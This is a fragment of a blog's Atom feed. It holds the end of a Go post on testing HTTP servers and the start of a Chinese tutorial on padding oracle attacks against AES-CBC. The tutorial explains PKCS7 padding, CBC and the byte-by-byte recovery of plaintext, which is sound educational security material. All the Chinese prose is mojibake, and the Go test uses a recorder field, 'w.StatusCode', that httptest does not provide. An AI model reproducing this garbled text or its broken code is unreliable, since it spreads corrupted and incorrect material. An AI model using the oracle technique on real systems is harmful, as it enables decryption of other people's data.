&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>sync.Once&lt;/code> ç¡®ä¿è¯¥ä»£ç åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œè€Œä¸”å…¶ä»–è°ƒç”¨ï¼ˆå…¶ä»–äººå‘èµ·åŒä¸€ä¸ªè¯·æ±‚æ—¶ï¼‰ä¼šä¸€ç›´é˜»å¡ç›´åˆ°æ‰§è¡Œç»“æŸã€‚&lt;/p>
&lt;ul>
&lt;li>é”™è¯¯æ£€æŸ¥æ”¾åœ¨ init å‡½æ•°å¤–é¢ï¼Œå› æ­¤å¦‚æœæœ‰é”™è¯¯å‘ç”Ÿï¼Œæˆ‘ä»¬å¯ä»¥æš´éœ²å‡ºè¯¥é”™è¯¯ï¼ŒåŒæ—¶ä¿ç•™é”™è¯¯æ—¥å¿—&lt;/li>
&lt;li>å¦‚æœè¯¥ handler æœªè¢«è°ƒç”¨ï¼Œåˆ™è¯¥é«˜æˆæœ¬æ“ä½œæ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œã€‚æœ‰äº›æƒ…å†µä¸‹è¿™æ ·åšæœ‰å¾ˆå¤§æ”¶ç›Šï¼Œå–å†³äºä½ çš„ä»£ç æ˜¯å¦‚ä½•éƒ¨ç½²çš„&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>è¿™ç§æ–¹å¼å®é™…ä¸Šæ˜¯å°†åˆå§‹åŒ–æ—¶é—´ä»å¯åŠ¨é˜¶æ®µè½¬ç§»åˆ°äº†è¿è¡Œæ—¶ã€‚å¦‚æœä½¿ç”¨ Google App Engine åˆ™å¾ˆæœ‰ç”¨ï¼Œå…¶ä»–åœºæ™¯åˆ™éœ€è¦å•ç‹¬è€ƒè™‘ã€‚&lt;/p>
&lt;/blockquote>
&lt;h2 id="æœåŠ¡å¯æµ‹æ€§">æœåŠ¡å¯æµ‹æ€§&lt;/h2>
&lt;p>ä¸Šè¿°çš„ server ç±»å‹æ˜¯å……åˆ†å¯æµ‹çš„ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">TestHandleAbout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">testing&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">is&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">is&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">srv&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">server&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">db&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">mockDatabase&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">email&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">mockEmailSender&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">srv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">routes&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">httptest&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewRequest&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;GET&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;/about&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">w&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">httptest&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewRecorder&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">srv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ServeHTTP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">is&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Equal&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">StatusCode&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">StatusOK&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>åœ¨æ¯ä¸ªæµ‹è¯•ä¸­åˆ›å»ºä¸€ä¸ª server å®ä¾‹ â€”â€” å¦‚æœè€—æ—¶æ“ä½œæ˜¯æ‡’åŠ è½½çš„ï¼Œé‚£ä¹ˆè¿™ä¹ˆåšä¸ä¼šè€—è´¹å¤ªå¤šæ—¶é—´ï¼Œå³ä½¿å¯¹äºå¤§ç»„ä»¶æ¥è¯´ä¹Ÿé€‚ç”¨&lt;/li>
&lt;li>é€šè¿‡è°ƒç”¨ server çš„ &lt;code>ServeHTTP&lt;/code> æ–¹æ³•ï¼ŒåŒ…æ‹¬è·¯ç”±ã€ä¸­é—´ä»¶ç­‰æ•´ä¸ªæ ˆéƒ½å¯ä»¥è¢«æµ‹åˆ°ã€‚å½“ç„¶ï¼Œå¦‚æœä½ ä¸å¸Œæœ›æµ‹è¯•æ•´ä¸ªæ ˆï¼Œä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨ handler æ–¹æ³•&lt;/li>
&lt;li>ä½¿ç”¨ &lt;code>httptest.NewRequest&lt;/code> å’Œ &lt;code>httptest.NewRecorder&lt;/code> æ¥è®°å½• handlers éƒ½åšäº†ä»€ä¹ˆ&lt;/li>
&lt;li>ä»£ç ä¸­ä½¿ç”¨äº† &lt;code>is&lt;/code> æµ‹è¯•æ¡†æ¶ï¼ŒTestify çš„ä¸€ä¸ªè¿·ä½ æ›¿ä»£ç‰ˆæœ¬ï¼š&lt;a href="https://github.com/matryer/is">is&lt;/a>&lt;/li>
&lt;/ul></content><category scheme="https://mincodes.com/tags/golang/" term="Golang" label="Golang"/><category scheme="https://mincodes.com/tags/server/" term="Server" label="Server"/></entry><entry><title type="text">Padding Oracle Attack</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/padding-oracle-attack/"/><id>https://mincodes.com/posts/padding-oracle-attack/</id><updated>2022-12-04T13:02:00+00:00</updated><published>2022-12-04T12:22:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">åŸç†é˜è¿° Padding åœ¨å¯†ç å­¦ä¸­ï¼Œç”±äºåº•å±‚åŠ å¯†ç®—æ³•å¾€å¾€æ˜¯é’ˆå¯¹å›ºå®šé•¿åº¦çš„å—æ¥è®¾è®¡çš„ï¼ˆä¾‹å¦‚ AES çš„ CBC æ¨¡å¼çš„å—å¤§å°ä¸º 16ï¼‰â€¦</summary><content type="html">&lt;h2 id="åŸç†é˜è¿°">åŸç†é˜è¿°&lt;/h2>
&lt;h3 id="padding">Padding&lt;/h3>
&lt;p>åœ¨å¯†ç å­¦ä¸­ï¼Œç”±äºåº•å±‚åŠ å¯†ç®—æ³•å¾€å¾€æ˜¯é’ˆå¯¹å›ºå®šé•¿åº¦çš„å—æ¥è®¾è®¡çš„ï¼ˆä¾‹å¦‚ AES çš„ CBC æ¨¡å¼çš„å—å¤§å°ä¸º 16ï¼‰ï¼Œæ‰€ä»¥åœ¨å¯¹å¯å˜é•¿åº¦çš„æ˜æ–‡è¿›è¡ŒåŠ å¯†æ—¶ï¼Œä¸€èˆ¬éœ€è¦é¢å¤–å¢åŠ  padding å­—æ®µæ¥æ»¡è¶³å—å¯¹é½ä»¥ä¾¿è¿›è¡ŒåŠ å¯†ã€‚&lt;/p>
&lt;p>Padding æ–¹æ³•å¯èƒ½æœ‰å¤šç§ï¼Œä¸ºç®€å•èµ·è§ï¼Œè¿™é‡Œåªè®¨è®ºå¸¸ç”¨çš„ PKCS7Padding æ–¹æ³•ã€‚åœ¨ PKCS7Padding æ–¹æ³•ä¸­ï¼Œpadding å­—æ®µå¡«å……çš„æ¯ä¸ªå­—èŠ‚çš„å€¼éƒ½æ˜¯ç›¸åŒçš„ï¼Œå…¶å€¼å‡ä¸ºéœ€è¦å¡«å……çš„å­—èŠ‚ä¸ªæ•°ï¼Œä¾‹å¦‚ï¼šå¦‚æœå—å¤§å°æ˜¯ 16ï¼Œ é‚£ä¹ˆæ˜æ–‡ &amp;ldquo;aaaa&amp;rdquo; çš„ padding å°±æ˜¯ [12]*12ã€‚å¦‚æœæ˜æ–‡é•¿åº¦åˆšå¥½æ˜¯å—å¤§å°çš„æ•´æ•°å€ï¼Œåˆ™éœ€è¦é¢å¤–åŠ ä¸Šä¸€ä¸ªå—çš„ paddingï¼Œå³ [16]*16 ã€‚&lt;/p>
&lt;p>PKCS7Padding çš„ Python å®ç°ä»£ç å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">def pkcs7padding(plaintext):
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bs = 16
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> padding_len = bs - len(plaintext) % bs
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> return plaintext + padding_len * chr(padding_len)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="padding-oracle">Padding Oracle&lt;/h3>
&lt;p>æŒ‡è¢«æ”»å‡»å¯¹è±¡æš´éœ²çš„ä¸€ä¸ªæ¥å£ï¼Œè¯¥æ¥å£å¯ä»¥é€šè¿‡ä»»æ„å½¢å¼æä¾›ï¼Œä¾‹å¦‚å¯èƒ½æ˜¯å‘½ä»¤è¡Œï¼Œå¯èƒ½æ˜¯APIï¼Œä¹Ÿå¯èƒ½æ˜¯ REST æ¥å£ç­‰ç­‰ã€‚å½¢å¼ä¸é‡è¦ï¼Œé‡è¦çš„æ˜¯å†…å®¹ï¼Œè¯¥æ¥å£å¯ä»¥è¾“å…¥å¯†æ–‡ï¼Œè¿”å›è¯¥æ®µå¯†æ–‡è§£å¯†åçš„ Padding æ˜¯å¦æ­£ç¡®ã€‚å¦‚æœè§£å¯†ç›¸å…³çš„åº”ç”¨å¼€å‘è€…ä¸å°å¿ƒï¼Œå¾ˆæœ‰å¯èƒ½ä¼šæš´éœ²å‡ºè¯¥ç±»æ¥å£ï¼ˆä¾‹å¦‚åœ¨æä¾› web æœåŠ¡æ—¶ï¼Œåç«¯è§£å¯†ä»£ç æœªå¯¹ Padding å¼‚å¸¸æƒ…å†µè¿›è¡Œæ•æ‰ï¼Œå¯¼è‡´ HTTP 500 é”™è¯¯ï¼‰ã€‚&lt;/p>
&lt;p>Padding Oracle Attack å°±æ˜¯åˆ©ç”¨ Padding Oracle æ¥è¿›è¡Œæ”»å‡»çš„ï¼Œç®€å•æ¥è¯´ï¼Œæ”»å‡»è€…é¦–å…ˆéœ€è¦çªƒå–ä¸€æ®µå¯†æ–‡ï¼Œå…¶æ¬¡è¦æœ‰ä¸€ä¸ª Padding Oracle å¯ä¾›åˆ©ç”¨ï¼Œç„¶åæ”»å‡»è€…ä¾¿å¯é€šè¿‡ä¸æ–­ç¯¡æ”¹å¯†æ–‡å¹¶å‘é€åˆ° Padding Oracle è¿›è¡ŒéªŒè¯çš„æ–¹å¼ï¼Œæ¥å¯¹è¿™æ®µå¯†æ–‡è¿›è¡Œç ´è§£ã€‚&lt;/p>
&lt;h3 id="xorå¼‚æˆ–">XORï¼ˆå¼‚æˆ–ï¼‰&lt;/h3>
&lt;p>åœ¨è§£é‡Šä¸‹ä¸€ä¸ªæ¦‚å¿µä¹‹å‰ï¼Œå…ˆè®©æˆ‘ä»¬ç¨å¾®å¤ä¹ ä¸‹ XORï¼ˆå¼‚æˆ–ï¼‰æ“ä½œã€‚ä¸‹é¢æ˜¯ XOR çš„ä¸€äº›åŸºæœ¬å…¬å¼ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl"> A âŠ• A = 0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> A âŠ• 0 = A
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> A âŠ• B = B âŠ• A
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> (A âŠ• B) âŠ• C = A âŠ• (B âŠ• C)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> âˆ´ A âŠ• B âŠ• B = A âŠ• (B âŠ• B) = A âŠ• 0 = A
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="cipher-block-chaining-cbc">Cipher-Block Chaining (CBC)&lt;/h3>
&lt;p>æœ¬æ–‡å°†é˜è¿°é’ˆå¯¹ AES CBC æ¨¡å¼çš„ Padding Oracle Attackï¼Œå› æ­¤ï¼Œæœ‰å¿…è¦å…ˆè§£é‡Šä¸‹ CBC æ¨¡å¼çš„å·¥ä½œè¿‡ç¨‹ã€‚&lt;/p>
&lt;p>é¡¾åæ€ä¹‰ï¼ŒCBC æ˜¯é’ˆå¯¹å—çš„åŠ å¯†ï¼Œè€Œä¸”å—ä¸å—ä¹‹é—´æ˜¯å­˜åœ¨é“¾å¼å…³ç³»çš„ï¼ˆè¿™ç§é“¾å¼å…³ç³»ä½ å¾ˆå¿«å°±ä¼šç†è§£äº†ï¼‰ã€‚&lt;/p>
&lt;h3 id="åŠ å¯†è¿‡ç¨‹">åŠ å¯†è¿‡ç¨‹&lt;/h3>
&lt;p>åœ¨ CBC ä¸­ï¼Œæœ‰ä¸€ä¸ªåå« &amp;ldquo;block cipher&amp;quot;çš„ä¸œè¥¿ï¼Œè¿™ä¸ª &amp;ldquo;block cipher&amp;rdquo; æ¥å—ã€å—ã€ä½œä¸ºè¾“å…¥ï¼Œå¯†æ–‡ä½œä¸ºè¾“å‡ºã€‚æœ¬æ–‡ä¸æ¶‰åŠ &amp;ldquo;block cipher&amp;rdquo; çš„å…·ä½“å·¥ä½œåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ &amp;ldquo;block cipher&amp;rdquo; å½“ä½œé»‘ç›’å­æ¥å¤„ç†ã€‚&lt;/p>
&lt;p>åœ¨ CBC åŠ å¯†è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸ª &amp;ldquo;plaintext block&amp;rdquo; åœ¨é€å…¥ &amp;ldquo;block cipher&amp;rdquo; å‰ï¼Œéƒ½éœ€è¦å…ˆå’Œå®ƒå‰é¢çš„ &amp;ldquo;ciphertext block&amp;rdquo; (å³å‰é¢ç›¸é‚»çš„å·²åŠ å¯†çš„å¯†æ–‡å—) è¿›è¡Œ XOR æ“ä½œï¼ŒXOR çš„ç»“æœå†é€å…¥ &amp;ldquo;block cipher&amp;quot;è¿›è¡ŒåŠ å¯†å¤„ç†ã€‚è¿™æ„å‘³ç€æ¯ä¸ªåŠ å¯†å‡ºæ¥çš„å¯†æ–‡å—éƒ½ä¾èµ–äºå‰é¢çš„æ˜æ–‡åŠ å¯†åçš„ç»“æœï¼Œå› æ­¤æ”¹å˜æ¯ä¸€ä¸ªæ˜æ–‡å­—ç¬¦éƒ½ä¼šå¯¹åé¢çš„åŠ å¯†ç»“æœäº§ç”Ÿå·¨å¤§å½±å“ã€‚è¿™æ˜¯ä¸€ç§è¢«æ¨èçš„ã€æ¯”è¾ƒå®‰å…¨çš„åŠ å¯†æ¨¡å¼ã€‚&lt;/p>
&lt;p>&lt;img src="https://mincodes.com/uploads/images/4503f42b-c535-4139-a452-66b5ebd9e572/Untitled.png" alt="">&lt;/p>
&lt;p>(from &lt;a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher-block_chaining_.28CBC.29">Wikipedia&lt;/a> )&lt;/p>
&lt;h3 id="è§£å¯†è¿‡ç¨‹">è§£å¯†è¿‡ç¨‹&lt;/h3>
&lt;p>ç±»ä¼¼çš„ï¼Œåœ¨è§£å¯†è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€ä¸ª &amp;ldquo;block cipher decryption&amp;rdquo;ï¼Œè¿™ä¸ªä¸œä¸œæ¥å—ã€å¯†æ–‡å—ã€ä½œä¸ºè¾“å…¥ï¼Œä½†è¾“å‡ºä¸æ˜¯æ˜æ–‡ï¼Œæ˜¯ä¸€ä¸ªä¸­é—´ç»“æœã€‚ç»“åˆä¸Šé¢åŠ å¯†çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬ä¸éš¾ç†è§£ï¼Œè¿™ä¸ªä¸­é—´ç»“æœå°±æ˜¯æ˜æ–‡åœ¨å’Œ previous cipher block å¼‚æˆ–ä¹‹åçš„ç»“æœã€‚æ‹¿åˆ°è¿™ä¸ªä¸­é—´ç»“æœåï¼Œè·Ÿè¿›å‰é¢å¼‚æˆ–å…¬å¼çš„æœ€åä¸€æ¡å¯çŸ¥ï¼Œåªéœ€å°†è¯¥ä¸­é—´ç»“æœå’Œ previous cipher block å†åšä¸€æ¬¡å¼‚æˆ–ï¼Œå³å¯å¾—åˆ°æœ€åˆçš„æ˜æ–‡å—ã€‚è‡³æ­¤ï¼Œè¯¥ block è§£å¯†ç»“æŸã€‚å¦‚æœæ˜¯ç¬¬ä¸€ä¸ª cipher blockï¼Œåˆ™å°†ä¸­é—´ç»“æœå’Œ IV è¿›è¡Œä¸€æ¬¡å¼‚æˆ–å³å¯å¾—åˆ°æ˜æ–‡å—ã€‚&lt;/p>
&lt;p>&lt;img src="https://mincodes.com/uploads/images/682e7e40-5dc0-4e8e-854a-c6724b36f52f/Untitled.png" alt="">&lt;/p>
&lt;p>(å›¾ç‰‡æ¥è‡ª &lt;a href="http://robertheaton.com/2013/07/29/padding-oracle-attack/">Rob Heaton&amp;rsquo;s blog&lt;/a> )&lt;/p>
&lt;p>å½“ç„¶ï¼Œå¦‚æœæ˜¯æœ€åä¸€ä¸ª blockï¼Œè¿˜éœ€è¦æ ¹æ® PKCS7Padding çš„è§„åˆ™å°†å°¾éƒ¨ Padding å‰”é™¤ï¼Œå‰”é™¤ Padding çš„ Python å®ç°ä»£ç å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">def pkcs7unpadding(plaintext):
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> padding_len = ord(plaintext[-1])
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # check if the padding_len is valid
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> return plaintext[:-padding_len]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="æ”»å‡»è¿‡ç¨‹">æ”»å‡»è¿‡ç¨‹&lt;/h3>
&lt;p>æœ‰äº†ä¸Šè¿°è¿™äº›æ¦‚å¿µï¼Œæ”»å‡»è¿‡ç¨‹å°±æ¯”è¾ƒå¥½ç†è§£äº†ã€‚&lt;/p>
&lt;p>æ”»å‡»è€…å°±æ˜¯é€šè¿‡è®¡ç®—ä¸Šé¢æåˆ°çš„ã€ä¸­é—´ç»“æœã€æ¥è¾¾åˆ°è§£å¯†ç›®çš„çš„ã€‚æ€ä¹ˆè®¡ç®—ã€ä¸­é—´ç»“æœã€å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è¯•ï¼åˆ©ç”¨ Padding Oracle æ¥è¯•ã€‚&lt;/p>
&lt;p>é¦–å…ˆï¼Œæ˜ç¡®å‡ ä¸ªæ¦‚å¿µï¼š&lt;/p>
&lt;ul>
&lt;li>æˆ‘ä»¬çªƒå–äº†ä¸€æ®µå¯†æ–‡&lt;/li>
&lt;li>æˆ‘ä»¬æ˜¯ä¸€å—ä¸€å—æ¥ç ´è§£çš„ï¼ˆå› ä¸º CBC æ˜¯ä¸€å—ä¸€å—åŠ å¯†çš„ï¼‰&lt;/li>
&lt;li>æˆ‘ä»¬æœ‰ä¸€ä¸ª Padding Oracle&lt;/li>
&lt;/ul>
&lt;p>ä¸ºäº†æè¿°æ–¹ä¾¿èµ·è§ï¼Œè¿™é‡Œå®šä¹‰å‡ ä¸ªç¼©å†™ï¼ˆå¯ç»“åˆä¸‹é¢çš„å›¾ç‰‡æ¥ç†è§£ï¼‰ï¼š&lt;/p>
&lt;ul>
&lt;li>C1: å¾…ç ´è§£å¯†æ–‡å—ç›¸é‚»çš„å‰é¢çš„å¯†æ–‡å—&lt;/li>
&lt;li>C2: å¾…ç ´è§£å¯†æ–‡å—&lt;/li>
&lt;li>I2: å¾…ç ´è§£å¯†æ–‡å—ç»è¿‡ &amp;ldquo;block cipher decryption&amp;rdquo; è§£å¯†å‡ºæ¥çš„ä¸­é—´ç»“æœï¼Œå¯ä¸ C1 å¼‚æˆ–åå¾—åˆ°æ˜æ–‡å—&lt;/li>
&lt;li>P2: å¾…ç ´è§£å¯†æ–‡å—è§£å¯†åçš„æ˜æ–‡å—&lt;/li>
&lt;/ul>
&lt;p>å› æ­¤æˆ‘ä»¬æœ‰å¦‚ä¸‹å…¬å¼ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">P2 = C1 ^ I2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>C1 æ˜¯å·²çŸ¥çš„ï¼Œå› æ­¤æˆ‘ä»¬çš„å·¥ä½œå°±æ˜¯ç®—å‡º I2 ã€‚&lt;/p>
&lt;h3 id="ç ´è§£æœ€åä¸€ä¸ªå­—èŠ‚">ç ´è§£æœ€åä¸€ä¸ªå­—èŠ‚&lt;/h3>
&lt;p>é¦–å…ˆï¼Œæˆ‘ä»¬ä»ç ´è§£æœ€åä¸€ä¸ª block çš„æœ€åä¸€ä¸ªå­—èŠ‚å¼€å§‹ã€‚&lt;/p>
&lt;p>æ ¹æ®å‰é¢çš„å®šä¹‰ï¼ŒC2 æ˜¯å¯†æ–‡çš„æœ€åä¸€ä¸ª blockï¼ŒC1 æ˜¯å¯†æ–‡çš„å€’æ•°ç¬¬äºŒä¸ª block ã€‚çœ‹ä¸‹ç ´è§£è¿‡ç¨‹ï¼š&lt;/p>
&lt;p>&lt;img src="https://mincodes.com/uploads/images/5dbd494a-82bb-4884-9ed5-85acb7eaff93/Untitled.png" alt="">&lt;/p>
&lt;p>(å›¾ç‰‡æ¥è‡ª &lt;a href="http://robertheaton.com/2013/07/29/padding-oracle-attack/">Rob Heaton&amp;rsquo;s blog&lt;/a> )&lt;/p>
&lt;ol>
&lt;li>å…ˆæŠŠ C1 æ›¿æ¢æˆ [0]*16 ï¼ˆå³16ä¸ª0ï¼‰ï¼ŒæŠŠæ–°çš„ C1 å«åš C1'&lt;/li>
&lt;li>æŠŠ C1&amp;rsquo; + C2 ä¼ å…¥ Padding Oracleï¼ŒæˆåŠŸåˆ™è·³åˆ°ç¬¬ 4 æ­¥ï¼Œå¦åˆ™ç»§ç»­&lt;/li>
&lt;li>C1&amp;rsquo;[15] è‡ªå¢ï¼ˆä¸Šé™æ˜¯ 255ï¼‰ï¼Œå¹¶é‡å¤ç¬¬ 2 æ­¥&lt;/li>
&lt;li>ç”±äº C1&amp;rsquo; + C2 é€šè¿‡äº† Padding æ£€æŸ¥ï¼Œå¯ä»¥ç¡®å®š P2&amp;rsquo;[15] ä¸€å®šæ˜¯ 1~16 ä¸­çš„ä¸€ä¸ªå€¼ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆå‡å®šæ˜¯1ï¼ˆå¯é€šè¿‡ç»§ç»­ä¿®æ”¹ C1&amp;rsquo; æ¥è¿›ä¸€æ­¥ç¡®å®š P2&amp;rsquo;[15] çš„å€¼ï¼Œä¸ºäº†é¿å…å¼•å…¥é¢å¤–çš„å¤æ‚åº¦ï¼Œè¿™é‡Œå…ˆä¸ä»‹ç»å¦‚ä½•ç¡®å®š P2&amp;rsquo;[15] çš„å€¼ï¼Œåé¢å†è¯¦ç»†ä»‹ç»ï¼‰ã€‚å‡è®¾æ­¤æ—¶ C1&amp;rsquo;[15] è‡ªå¢åˆ°äº† 94ï¼Œåˆ™æŒ‰ç…§å¦‚ä¸‹å…¬å¼å¯è®¡ç®—å‡º I2[15]&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">I2 = C1&amp;#39; ^ P2&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I2[15] = C1&amp;#39;[15] ^ P2&amp;#39;[15]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I2[15] = 94 ^ 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> = 95
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
